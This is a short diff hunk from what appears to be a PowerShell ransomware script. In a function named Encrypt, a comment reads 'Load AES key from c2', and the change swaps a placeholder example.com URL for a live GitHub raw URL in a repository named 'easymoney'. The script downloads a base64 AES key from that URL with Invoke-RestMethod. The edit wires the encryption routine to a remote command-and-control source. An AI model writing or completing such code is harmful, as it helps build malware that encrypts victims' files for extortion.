@@ -238,7 +238,7 @@ function Encrypt
     
     # Load AES key from c2
 
-    $KeyUrl = "https://example.com/DecryptionKey.txt"
+    $KeyUrl = "https://github.com/bsoroudi/easymoney/blob/updates/key?raw=true"
     $keyBase64 = Invoke-RestMethod -Uri $KeyUrl
     $keyBytes = [Convert]::FromBase64String($keyBase64)
 
